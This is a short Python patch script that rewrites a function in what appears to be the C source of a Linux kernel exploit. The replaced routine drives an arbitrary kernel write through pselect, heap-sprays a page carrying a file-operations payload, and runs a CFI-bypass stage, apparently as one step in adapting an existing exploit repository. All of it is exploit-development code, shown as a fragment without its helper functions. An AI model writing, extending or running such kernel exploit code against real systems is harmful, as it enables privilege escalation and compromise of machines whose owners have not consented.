import re
p='src/core/main.c'
s=open(p).read()

start = s.index('static int do_one_write(uintptr_t target, const char *desc, int mode) {')
end = s.index('\n}\n', start) + len('\n}\n')
new = '''static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  /* Single process, like the original repo: the route threads run here and the
   * route itself calls try_cfi_stage() (route_only_mode == 0).  No fork/exec. */
  run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}
'''
s = s[:start] + new + s[end:]
open(p,'w').write(s)
print('do_one_write reverted to single-process')
